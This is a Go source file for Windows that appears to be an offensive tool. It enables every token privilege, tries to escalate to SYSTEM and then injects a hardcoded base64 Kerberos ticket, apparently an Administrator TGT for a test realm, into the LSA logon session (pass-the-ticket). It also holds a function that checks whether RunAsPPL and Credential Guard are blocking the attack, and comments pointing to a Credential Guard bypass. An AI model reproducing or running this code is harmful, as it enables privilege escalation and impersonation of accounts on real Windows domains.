//go:build windows

package main

import (
	"fmt"
	"log"
	"os"
	"time"

	"github.com/fourcorelabs/wintoken"
	"github.com/unstppbl/gobeus/lsa"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

var DEBUG bool

var ticket = "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"

func main() {
	DEBUG = true

	// CheckProtect()
	// return

	if len(os.Args) > 1 {
		time.Sleep(time.Second * 20)
	}
	lsa.DebugLSA = false
	// check privs
	curToken, err := wintoken.OpenProcessToken(int(windows.GetCurrentProcessId()), wintoken.TokenPrimary)
	if err != nil {
		panic(err)
	}
	defer curToken.Close()
	if !curToken.Token().IsElevated() {
		log.Fatal("[ERROR] Not running in an elevated context")
	}
	curToken.EnableAllPrivileges()
	privs, _ := curToken.GetPrivileges()
	for _, p := range privs {
		if p.Name == "SeImpersonatePrivilege" {
			fmt.Println("[+] We have SeImpersonatePrivilege")
		}
	}

	// attempt to escalate to system
	GetSystem()

	// get handle to lsa
	lsaHandle, err := lsa.GetLsaHAndle()
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("[+] LSA Handle:", &lsaHandle)
	// get the auth package
	authPack, err := lsa.LookupAuthPackage(lsaHandle)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("[+] Auth Package:", authPack)

	// lsa.DumpTickets(lsaHandle, authPack)
	if err := lsa.SubmitTicketFromBase64(lsaHandle, authPack, ticket); err != nil {
		log.Fatal(err)
	}
}

// RunAsPPL
// HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa.
// Set the value of the registry key to:
// "RunAsPPL"=dword:00000001 to configure the feature with a UEFI variable.
// "RunAsPPL"=dword:00000002 to configure the feature without a UEFI variable (only on Windows 11, 22H2).

// poc to patch wdigest.dll to bypass
// https://teamhydra.blog/2020/08/25/bypassing-credential-guard/
// https://gist.github.com/N4kedTurtle/8238f64d18932c7184faa2d0af2f1240

func CheckProtect() bool {
	// check for RunAsPPL
	regInfo, err := registry.OpenKey(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Control\Lsa`, registry.QUERY_VALUE)
	if err != nil {
		log.Fatal(err)
	}
	a, _, _ := regInfo.GetIntegerValue("RunAsPPL")
	if a != 0 {
		log.Fatal("[ERROR] RunAsPPL is enabled, this is not going to work!")
	}

	regInfo, err = registry.OpenKey(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Control\Lsa`, registry.QUERY_VALUE)
	if err != nil {
		log.Fatal(err)
	}
	a, _, _ = regInfo.GetIntegerValue("LsaCfgFlags")
	if a != 0 {
		log.Fatal("[ERROR] Credential Guard is enabled, this is not going to work!")
	}

	return false
}
